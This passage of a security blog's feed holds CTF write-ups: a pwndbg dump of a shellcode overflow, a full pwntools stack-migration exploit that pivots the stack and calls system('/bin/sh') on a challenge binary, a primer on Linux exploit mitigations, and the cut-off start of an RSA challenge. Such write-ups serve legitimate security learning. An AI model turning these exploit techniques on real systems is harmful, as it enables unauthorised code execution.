punctuation">]</span>────────────────────────────────────────────────────────────────────────────────────── RAX  <span class="token number">0x7fffffffdca4</span> ◂— <span class="token number">0x6161616161616161</span> <span class="token punctuation">(</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span> RBX  <span class="token number">0x0</span> RCX  <span class="token number">0xffffdce062626262</span> RDX  <span class="token number">0x7fffff</span> RDI  <span class="token number">0x7fffffffdcb4</span> ◂— <span class="token number">0xffffdce062626262</span> RSI  <span class="token number">0x7fffffffdcd0</span> ◂— <span class="token number">0xffffdce062626262</span> R8   <span class="token number">0x7ffff7f9e500</span> ◂— add    ch<span class="token punctuation">,</span> ah <span class="token operator">/</span><span class="token operator">*</span> <span class="token number">0x7ffff7f9e500</span> <span class="token operator">*</span><span class="token operator">/</span> R9   <span class="token number">0x7fffffffdb67</span> ◂— <span class="token number">0xa87c57a943ef0034</span> <span class="token operator">/</span><span class="token operator">*</span> <span class="token string">'4'</span> <span class="token operator">*</span><span class="token operator">/</span> R10  <span class="token number">0xfffffffffffff4a8</span> R11  <span class="token number">0x7ffff7f58a60</span> ◂— add    byte ptr <span class="token punctuation">[</span>rdx<span class="token punctuation">]</span><span class="token punctuation">,</span> cl R12  <span class="token number">0x555555555090</span> ◂— xor    ebp<span class="token punctuation">,</span> ebp R13  <span class="token number">0x7fffffffe190</span> ◂— <span class="token number">0x1</span> R14  <span class="token number">0x0</span> R15  <span class="token number">0x0</span> RBP  <span class="token number">0x6262626262626262</span> <span class="token punctuation">(</span><span class="token string">'bbbbbbbb'</span><span class="token punctuation">)</span> RSP  <span class="token number">0x7fffffffdcb8</span> —▸ <span class="token number">0x7fffffffdce0</span> ◂— <span class="token number">0x9090909090909090</span> RIP  <span class="token number">0x5555555551dc</span> ◂— ret    ───────────────────────────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> DISASM <span class="token punctuation">]</span>────────────────────────────────────────────────────────────────────────────────────────   <span class="token number">0x5555555551ce</span>    lea    rdi<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0xe46</span><span class="token punctuation">]</span>   <span class="token number">0x5555555551d5</span>    call   <span class="token number">0x555555555040</span>   <span class="token number">0x5555555551da</span>    nop       <span class="token number">0x5555555551db</span>    leave   ► <span class="token number">0x5555555551dc</span>    ret    <span class="token operator">&lt;</span><span class="token number">0x7fffffffdce0</span><span class="token operator">></span>   <span class="token number">0x5555555551dd</span>    push   rbp   <span class="token number">0x5555555551de</span>    mov    rbp<span class="token punctuation">,</span> rsp   <span class="token number">0x5555555551e1</span>    sub    rsp<span class="token punctuation">,</span> <span class="token number">0x3f0</span>   <span class="token number">0x5555555551e8</span>    lea    rdi<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0xe31</span><span class="token punctuation">]</span>   <span class="token number">0x5555555551ef</span>    mov    eax<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token number">0x5555555551f4</span>    call   <span class="token number">0x555555555050</span>────────────────────────────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>────────────────────────────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffdcb8</span> —▸ <span class="token number">0x7fffffffdce0</span> ◂— <span class="token number">0x9090909090909090</span><span class="token number">01</span><span class="token punctuation">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffdcc0</span> ◂— <span class="token number">0x6161616161616161</span> <span class="token punctuation">(</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span><span class="token number">02</span><span class="token punctuation">:</span><span class="token number">0010</span>│      <span class="token number">0x7fffffffdcc8</span> ◂— <span class="token number">0x6262626261616161</span> <span class="token punctuation">(</span><span class="token string">'aaaabbbb'</span><span class="token punctuation">)</span><span class="token number">03</span><span class="token punctuation">:</span><span class="token number">0018</span>│ rsi  <span class="token number">0x7fffffffdcd0</span> ◂— <span class="token number">0xffffdce062626262</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">0020</span>│      <span class="token number">0x7fffffffdcd8</span> ◂— <span class="token number">0x9090909000007fff</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffdce0</span> ◂— <span class="token number">0x9090909090909090</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ↓──────────────────────────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>────────────────────────────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>     <span class="token number">5555555551dc</span>   f <span class="token number">1</span>     <span class="token number">7fffffffdce0</span>   f <span class="token number">2</span> <span class="token number">6161616161616161</span>   f <span class="token number">3</span> <span class="token number">6262626261616161</span>   f <span class="token number">4</span> ffffdce062626262   f <span class="token number">5</span> <span class="token number">9090909000007fff</span>   f <span class="token number">6</span> <span class="token number">9090909090909090</span>   f <span class="token number">7</span> <span class="token number">9090909090909090</span>   f <span class="token number">8</span> <span class="token number">9090909090909090</span>   f <span class="token number">9</span> b848686a90909090   f <span class="token number">10</span> <span class="token number">732f2f2f6e69622f</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> </code></pre><p><code>Exp Running Status</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190719161033.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Buffer overflow triggered by integer overflow☕……&lt;/p&gt;
    
    </summary>
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/categories/Binary/"/>
    
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/tags/Binary/"/>
    
      <category term="Overflow" scheme="http://www.yof3ng.xyz/tags/Overflow/"/>
    
  </entry>
  
  <entry>
    <title>Ciscn_Pwn_Stack_Migration</title>
    <link href="http://www.yof3ng.xyz/2019/07/18/Ciscn-Pwn-Stack-Migration/"/>
    <id>http://www.yof3ng.xyz/2019/07/18/Ciscn-Pwn-Stack-Migration/</id>
    <published>2019-07-18T13:11:46.000Z</published>
    <updated>2019-07-19T12:15:28.844Z</updated>
    
    <content type="html"><![CDATA[<p>Stack migration in Ciscn…</p><a id="more"></a><h1 id="Ciscn-Pwn-Stack-Migration"><a href="#Ciscn-Pwn-Stack-Migration" class="headerlink" title="Ciscn_Pwn_Stack_Migration"></a>Ciscn_Pwn_Stack_Migration</h1><h2 id="Main-Source-Code"><a href="#Main-Source-Code" class="headerlink" title="Main Source Code"></a>Main Source Code</h2><p>main:</p><pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> <span class="token punctuation">;</span> <span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span>                 public main<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> main            proc near               <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> _start<span class="token operator">+</span><span class="token number">17</span>↑o<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> var_4           <span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> argc            <span class="token operator">=</span> dword ptr  <span class="token number">8</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> argv            <span class="token operator">=</span> dword ptr  0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> envp            <span class="token operator">=</span> dword ptr  10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> <span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span>                 lea     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048603</span>                 and     esp<span class="token punctuation">,</span> 0FFFFFFF0h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048606</span>                 push    dword ptr <span class="token punctuation">[</span>ecx<span class="token number">-4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048609</span>                 push    ebp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860A                 mov     ebp<span class="token punctuation">,</span> esp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860C                 push    ecx<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860D                 sub     esp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048610</span>                 call    init<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048615</span>                 sub     esp<span class="token punctuation">,</span> 0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048618</span>                 push    offset s        <span class="token punctuation">;</span> <span class="token string">"Welcome, my friend. What's your name?"</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804861D                 call    _puts<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048622</span>                 add     esp<span class="token punctuation">,</span> 10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048625</span>                 call    vul<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804862A                 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0804862F</span>                 mov     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048632</span>                 leave<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048633</span>                 lea     esp<span class="token punctuation">,</span> <span class="token punctuation">[</span>ecx<span class="token number">-4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span>                 retn<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span> <span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// starts at 80485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span> main            endp<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome, my friend. What's your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>vul:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># buf_size = 0x28</span><span class="token comment" spellcheck="true"># read_size = 0x30</span><span class="token comment" spellcheck="true"># buf_addr = ebp - 0x28</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># vul loop1:</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy1'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804b000</span><span class="token operator">-</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vul'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">''' Program Status──────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────── EAX  0x30 EBX  0x0 ECX  0xfff9442c ◂— 'Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' EDX  0xf7ee2890 ◂— 0x0 EDI  0xf7ee1000 ◂— 0x1d9d6c ESI  0xf7ee1000 ◂— 0x1d9d6c EBP  0xfff969a8 —▸ 0x804af00 ◂— 0x0 ESP  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' EIP  0x80485fd (vul+104) ◂— leave  ───────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────   0x80485ee &lt;vul+89>     push   eax   0x80485ef &lt;vul+90>     push   0x80486ca   0x80485f4 &lt;vul+95>     call   printf@plt &lt;0x80483e0>   0x80485f9 &lt;vul+100>    add    esp, 0x10   0x80485fc &lt;vul+103>    nop     ► 0x80485fd &lt;vul+104>    leave     0x80485fe &lt;vul+105>    ret       0x80485ff &lt;main>       lea    ecx, dword ptr [esp + 4]   0x8048603 &lt;main+4>     and    esp, 0xfffffff0   0x8048606 &lt;main+7>     push   dword ptr [ecx - 4]   0x8048609 &lt;main+10>    push   ebp────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ↓──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────── ► f 0  80485fd vul+104─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Breakpoint *vul+104pwndbg> stack 2000:0000│ esp  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ↓0a:0028│ ebp  0xfff969a8 —▸ 0x804af00 ◂— 0x00b:002c│      0xfff969ac —▸ 0x804859b (vul+6) ◂— sub    esp, 4'''</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''**********Notes*************{???} means a program address random....{==>} means point to....{&lt;= } means value at the address'''</span><span class="token triple-quoted-string string">'''*********cover ebp**********ebp = ??? ==> 0x804af00 &lt;= 0'''</span><span class="token triple-quoted-string string">'''***** hijacking ebp and cover return address to vul+6 ******leave:     mov esp,ebp ;            esp = ??? ==>0x804af00 &lt;= 0    pob ebp ;                     esp = ???+4 ;         ebp = 0x804af00 &lt;=0ret vul+6;'''</span><span class="token comment" spellcheck="true">#vul loop2:</span><span class="token comment" spellcheck="true">#gadget</span>leave_ret <span class="token operator">=</span> <span class="token number">0x80484b8</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed8</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\0'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''******** send payload ********1.buf_addr = ebp - 0x28 = 0x804af00 - 0x28 = 0x804aed82.(0x804aed8 + 0x10 = 0x804aef8) This value was writed in 0x 804aef0...It means that args point to '/bin/sh' at 0x804aef8...3.ebp = 0x804af00 ==> 0x804aed4 &lt;= 04.leave:        mov esp,ebp:            esp = 0x804af00 ==> 0x804aed4 &lt;= 0 ;         pop ebp:            esp = 0x804af04 ==> leave_ret;            ebp = 0x804aed4;5.ret leave_ret'''</span><span class="token triple-quoted-string string">'''******* leave_ret*********leave:    mov esp,ebp:        esp = 0x804aed4 &lt;= 0;    pop ebp:        esp = 0x804aed8 ==> system        ebp = 0x0;ret system('/bin/sh');----------------------------------------------------------------------------pwndbg> stack 3000:0000│ esp  0x804aed8 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]01:0004│      0x804aedc ◂— 0x002:0008│      0x804aee0 —▸ 0x804aee8 ◂— '/bin/sh'03:000c│      0x804aee4 ◂— 0x004:0010│      0x804aee8 ◂— '/bin/sh'05:0014│      0x804aeec ◂— 0x68732f /* '/sh' */06:0018│      0x804aef0 ◂— 0x0... ↓0a:0028│      0x804af00 —▸ 0x804aed4 ◂— 0x00b:002c│      0x804af04 —▸ 0x80484b8 (deregister_tm_clones+40) ◂— leave  0c:0030│      0x804af08 ◂— 0x0------------------------------------------------------------------------------'''</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Mind：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190719201500.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Stack migration in Ciscn…&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="Ciscn" scheme="http://www.yof3ng.xyz/tags/Ciscn/"/>
    
  </entry>
  
  <entry>
    <title>Binary_Security_Guidance</title>
    <link href="http://www.yof3ng.xyz/2019/07/18/Binary-Security-Guidance/"/>
    <id>http://www.yof3ng.xyz/2019/07/18/Binary-Security-Guidance/</id>
    <published>2019-07-18T06:08:39.000Z</published>
    <updated>2019-07-18T08:20:52.906Z</updated>
    
    <content type="html"><![CDATA[<p>Here is a summary of knowledge points for binary security. The reason for this article is that I can learn binary security specifically😄.</p><a id="more"></a><p>[TOC]</p><h1 id="✉Binary-Security-Guidance"><a href="#✉Binary-Security-Guidance" class="headerlink" title="✉Binary_Security_Guidance"></a>✉Binary_Security_Guidance</h1><blockquote><p>Binary security refers to guaranteeing the information security of binary data when transmitting data, that is, not being tampered with, decoded and so on. If attacked, it can be detected in time.</p><p>Binary security includes some things of cryptography, such as encryption and decryption, signature and so on.</p><p>In <code>CTF</code> competitions, binary security usually appear in the form of <code>reverse</code> and <code>pwn</code>. You will get a compiled program to analyze its logic and then crack it.</p></blockquote><h2 id="📖Linux-Pwn"><a href="#📖Linux-Pwn" class="headerlink" title="📖Linux Pwn"></a>📖Linux Pwn</h2><blockquote><p>Cause pwn of linux is normally favorite example form now. So i decide to start pwn from linux platform.</p></blockquote><h3 id="Security-protection-mechanism"><a href="#Security-protection-mechanism" class="headerlink" title="Security protection mechanism"></a>Security protection mechanism</h3><blockquote><p>In the linux, we can use instructions called <code>checksec</code> to see the security protection mechanism of our target program. So the first we should know is kinds of protection mechanism.</p></blockquote><p> <img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190718144432.png" alt=""></p><h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><blockquote><p>Canary is a kind of protection technique to mitigate stack overflow.</p><p>You can set the canary by following args.</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#Quoted From CTF-WIKI</span><span class="token comment" spellcheck="true">#enables protection, but only inserts protection for functions that have arrays in local variables</span>-fstack-protector <span class="token comment" spellcheck="true">#Enable protection, insert protection for all functions</span>-fstack-protector-all -fstack-protector-strong<span class="token comment" spellcheck="true">#Only protects functions with explicit stack_protect attribute</span>-fstack-protector-explicit <span class="token comment" spellcheck="true">#Disable protection.</span>-fno-stack-protector </code></pre><p>Here is a example to understand what role canary play.</p><pre class=" language-bash"><code class="language-bash">        High        Address <span class="token operator">|</span>                 <span class="token operator">|</span>                +-----------------+                <span class="token operator">|</span> args            <span class="token operator">|</span>                +-----------------+                <span class="token operator">|</span> <span class="token keyword">return</span> address  <span class="token operator">|</span>                +-----------------+        rbp <span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">|</span> old ebp         <span class="token operator">|</span>                +-----------------+      rbp-8 <span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">|</span> canary value    <span class="token operator">|</span>                +-----------------+<span class="token operator">|</span> Local variables <span class="token operator">|</span>        Low     <span class="token operator">|</span>                 <span class="token operator">|</span>        Address</code></pre><p>The canary value is usually stored in <code>TLS==&gt;fs:[0x28]</code>, this value is also called <code>stack_guard</code>. If the canary value was changed illegally, the program flow will go to a func called <code>__stack_chk_fail</code> in glibc. And then you can’t crack the program as you think, it will prevent the easy stack overflow.(PS: Bypass Canary will be talked later…)</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><blockquote><p>Nx(No Excute) enabled means instructions in stack won’t be allowed to execute. Normally attack ways like <code>call esp</code> and <code>jmp esp</code> will out of action. But we can use ROP technique to bypass NX. </p></blockquote><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><blockquote><p>RELRO, this kind of protection mechanism has two form: <code>Partial RELRO</code> and <code>Full RELRO</code>. If program was Full RELRO, we wouldn’t change the <code>Got-table</code>.</p></blockquote><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><blockquote><p>PIE（position-independent executable） enabled means program’s memory address is random while running the program each time.</p><p>The basic address is 0x400000 when program’s status is <code>No-PIE</code>.</p></blockquote><h4 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h4><blockquote><p>Has RWX(Read&amp;Write&amp;Execute) segments means program has some segments you have the power to read, write and execute.</p><p>You can try to understand it by following picture:</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190718153217.png" alt=""></p><h3 id="Common-Attack-Ways"><a href="#Common-Attack-Ways" class="headerlink" title="Common Attack Ways"></a>Common Attack Ways</h3><blockquote><p>So what we should learn then? It’s no denying we should aim at understanding basic principles of common attack ways. </p></blockquote><ul><li>Stack overflow</li><li>Format string vulnerability</li><li>Glibc Heap uses</li><li>IO_FILE uses</li><li>Conditional competition</li><li>Integer overflow</li><li>Sandbox escape</li><li>Linux Kernel</li><li>Others Framework(like arm,arch)</li></ul><h2 id="📖Reverse"><a href="#📖Reverse" class="headerlink" title="📖Reverse"></a>📖Reverse</h2><p>later…</p><h2 id="⏱Concluding-remarks"><a href="#⏱Concluding-remarks" class="headerlink" title="⏱Concluding remarks"></a>⏱Concluding remarks</h2><p>Fighting or losing, depend on yourself😀.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Here is a summary of knowledge points for binary security. The reason for this article is that I can learn binary security specifically😄.&lt;/p&gt;
    
    </summary>
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/categories/Binary/"/>
    
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/tags/Binary/"/>
    
  </entry>
  
  <entry>
    <title>2019强网杯_Copperstudy</title>
    <link href="http://www.yof3ng.xyz/2019/05/29/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-Copperstudy/"/>
    <id>http://www.yof3ng.xyz/2019/05/29/2019强网杯-Copperstudy/</id>
    <published>2019-05-29T00:44:33.000Z</published>
    <updated>2019-05-29T03:08:26.786Z</updated>
    
    <content type="html"><![CDATA[<p>一道RSA过一遍各种攻击。</p><a id="more"></a><p>[TOC]</p><h1 id="🚩2019强网杯-Copperstudy"><a href="#🚩2019强网杯-Copperstudy" class="headerlink" title="🚩2019强网杯_Copperstudy"></a>🚩2019强网杯_Copperstudy</h1><blockquote><p>😭卡在第五关，一看wp发现少copy了一个n，以为有n和m两个未知数（ps:sage真强大）。</p></blockquote><h2 id="✅Challenge-0"><a href="#✅Challenge-0" class="headerlink" title="✅Challenge 0"></a>✅Challenge 0</h2><p>只需爆破得出skr的值，这是门槛。</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>proof<span class="token punctuation">:</span> skr<span class="token operator">=</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>skr<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>a904dcc09fcdc1d641905b0b50513922c94ad030223cf8eb3bbaa9b21b6788a5<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>skr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#------------step 1</span>cipher <span class="token operator">=</span> <span class="token string">''</span>skr_part <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token 